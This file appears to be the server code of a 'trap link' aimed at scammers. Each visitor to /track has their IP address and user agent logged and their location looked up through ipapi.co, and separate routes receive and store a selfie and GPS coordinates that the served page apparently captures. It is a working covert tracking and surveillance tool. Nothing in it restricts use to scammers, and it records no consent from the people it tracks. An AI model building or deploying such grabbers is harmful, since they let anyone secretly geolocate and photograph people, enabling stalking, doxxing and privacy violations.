const express = require("express");
const axios = require("axios");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json()); // For parsing POST requests

// Load or initialize logs file
const LOG_FILE = "scammer_logs.json";
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

// Route for the trap link
app.get("/track", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  console.log(`Visitor: IP=${ip}, UA=${userAgent}, Time=${timestamp}`);

  let locationData = {};
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    locationData = response.data;
    console.log(
      `Location: City=${locationData.city}, Region=${locationData.region}, Country=${locationData.country_name}`
    );
  } catch (error) {
    console.error("IP Location Error:", error.message);
  }

  // Save to file
  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  const entry = {
    timestamp,
    ip,
    userAgent,
    ipLocation: {
      city: locationData.city || "Unknown",
      region: locationData.region || "Unknown",
      country: locationData.country_name || "Unknown",
    },
  };
  logs.push(entry);
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Route to save selfie
app.post("/save-selfie", (req, res) => {
  const { selfie } = req.body;
  const timestamp = new Date().toISOString();
  console.log("Received selfie at:", timestamp);
  console.log("Selfie data:", selfie);

  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  logs.push({ timestamp, selfie });
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

  res.send("Selfie saved");
});

// Route to save location
app.post("/save-location", (req, res) => {
  const { latitude, longitude } = req.body;
  const timestamp = new Date().toISOString();
  console.log(`Received location: Lat=${latitude}, Lon=${longitude}`);

  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  logs.push({ timestamp, latitude, longitude });
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

  res.send("Location saved");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
